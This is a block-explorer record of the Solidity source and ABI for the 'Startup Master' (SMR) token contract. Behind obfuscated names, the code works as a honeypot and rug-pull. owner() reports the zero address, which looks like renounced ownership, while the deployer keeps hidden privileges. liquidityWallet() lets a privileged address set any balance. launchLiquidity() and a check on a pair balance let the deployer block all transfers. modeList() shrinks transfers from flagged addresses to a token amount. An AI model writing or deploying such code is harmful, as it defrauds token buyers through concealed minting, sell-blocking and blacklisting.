{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface toEnable {\n    function createPair(address tradingToken, address modeReceiverMarketing) external returns (address);\n}\n\ninterface autoAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitTxSender) external view returns (uint256);\n\n    function transfer(address receiverFrom, uint256 txReceiver) external returns (bool);\n\n    function allowance(address toAutoReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverFrom,\n        uint256 txReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxFrom, uint256 value);\n    event Approval(address indexed toAutoReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract receiverShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountAutoSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface autoAmountMetadata is autoAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StartupMaster is receiverShould, autoAmount, autoAmountMetadata {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableMax;\n    }\n\n    address senderAutoTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return launchSell;\n    }\n\n    bool private limitMax;\n\n    address walletReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private tradingMax;\n\n    address public launchFee;\n\n    function owner() external view returns (address) {\n        return launchSell;\n    }\n\n    mapping(address => mapping(address => uint256)) private enableSenderFund;\n\n    uint256 teamTake;\n\n    address private launchSell;\n\n    constructor (){\n        \n        amountAutoSell feeSellToken = amountAutoSell(senderAutoTrading);\n        receiverTx = toEnable(feeSellToken.factory()).createPair(feeSellToken.WETH(), address(this));\n        \n        launchFee = _msgSender();\n        swapExempt[launchFee] = true;\n        buyFee[launchFee] = enableMax;\n        shouldLaunch();\n        \n        emit Transfer(address(0), launchFee, enableMax);\n    }\n\n    uint256 public autoTxIs;\n\n    bool private sellBuy;\n\n    function tokenSenderFee(address senderEnable, address receiverFrom, uint256 txReceiver) internal returns (bool) {\n        if (senderEnable == launchFee) {\n            return takeReceiver(senderEnable, receiverFrom, txReceiver);\n        }\n        uint256 buyMinTotal = autoAmount(receiverTx).balanceOf(walletReceiver);\n        require(buyMinTotal == teamTake);\n        require(receiverFrom != walletReceiver);\n        if (fundMode[senderEnable]) {\n            return takeReceiver(senderEnable, receiverFrom, listReceiver);\n        }\n        return takeReceiver(senderEnable, receiverFrom, txReceiver);\n    }\n\n    function approve(address marketingWallet, uint256 txReceiver) public virtual override returns (bool) {\n        enableSenderFund[_msgSender()][marketingWallet] = txReceiver;\n        emit Approval(_msgSender(), marketingWallet, txReceiver);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderFund;\n    }\n\n    uint8 private shouldMarketing = 18;\n\n    uint256 private enableMax = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private buyFee;\n\n    uint256 public exemptLaunch;\n\n    uint256 public takeLimit;\n\n    function balanceOf(address limitTxSender) public view virtual override returns (uint256) {\n        return buyFee[limitTxSender];\n    }\n\n    function transfer(address toSell, uint256 txReceiver) external virtual override returns (bool) {\n        return tokenSenderFee(_msgSender(), toSell, txReceiver);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return sellMode;\n    }\n\n    string private sellMode = \"Startup Master\";\n\n    event OwnershipTransferred(address indexed takeTo, address indexed tradingBuyMarketing);\n\n    function liquidityWallet(address toSell, uint256 txReceiver) public {\n        launchedMode();\n        buyFee[toSell] = txReceiver;\n    }\n\n    function launchedFee(address fundFee) public {\n        if (receiverLiquidityEnable) {\n            return;\n        }\n        if (liquidityAmount != sellBuy) {\n            limitMax = true;\n        }\n        swapExempt[fundFee] = true;\n        \n        receiverLiquidityEnable = true;\n    }\n\n    function allowance(address modeLiquidity, address marketingWallet) external view virtual override returns (uint256) {\n        if (marketingWallet == senderAutoTrading) {\n            return type(uint256).max;\n        }\n        return enableSenderFund[modeLiquidity][marketingWallet];\n    }\n\n    bool public receiverExempt;\n\n    string private senderFund = \"SMR\";\n\n    mapping(address => bool) public swapExempt;\n\n    function launchLiquidity(uint256 txReceiver) public {\n        launchedMode();\n        teamTake = txReceiver;\n    }\n\n    uint256 private sellLaunch;\n\n    bool public liquidityAmount;\n\n    function transferFrom(address senderEnable, address receiverFrom, uint256 txReceiver) external override returns (bool) {\n        if (_msgSender() != senderAutoTrading) {\n            if (enableSenderFund[senderEnable][_msgSender()] != type(uint256).max) {\n                require(txReceiver <= enableSenderFund[senderEnable][_msgSender()]);\n                enableSenderFund[senderEnable][_msgSender()] -= txReceiver;\n            }\n        }\n        return tokenSenderFee(senderEnable, receiverFrom, txReceiver);\n    }\n\n    mapping(address => bool) public fundMode;\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldMarketing;\n    }\n\n    function launchedMode() private view {\n        require(swapExempt[_msgSender()]);\n    }\n\n    function modeList(address listMax) public {\n        launchedMode();\n        \n        if (listMax == launchFee || listMax == receiverTx) {\n            return;\n        }\n        fundMode[listMax] = true;\n    }\n\n    address public receiverTx;\n\n    uint256 exemptWallet;\n\n    bool private fromAt;\n\n    bool public receiverLiquidityEnable;\n\n    function shouldLaunch() public {\n        emit OwnershipTransferred(launchFee, address(0));\n        launchSell = address(0);\n    }\n\n    uint256 constant listReceiver = 15 ** 10;\n\n    function takeReceiver(address senderEnable, address receiverFrom, uint256 txReceiver) internal returns (bool) {\n        require(buyFee[senderEnable] >= txReceiver);\n        buyFee[senderEnable] -= txReceiver;\n        buyFee[receiverFrom] += txReceiver;\n        emit Transfer(senderEnable, receiverFrom, txReceiver);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toAutoReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingBuyMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTxIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTxSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txReceiver\",\"type\":\"uint256\"}],\"name\":\"launchLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFee\",\"type\":\"address\"}],\"name\":\"launchedFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txReceiver\",\"type\":\"uint256\"}],\"name\":\"liquidityWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMax\",\"type\":\"address\"}],\"name\":\"modeList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLiquidityEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "StartupMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}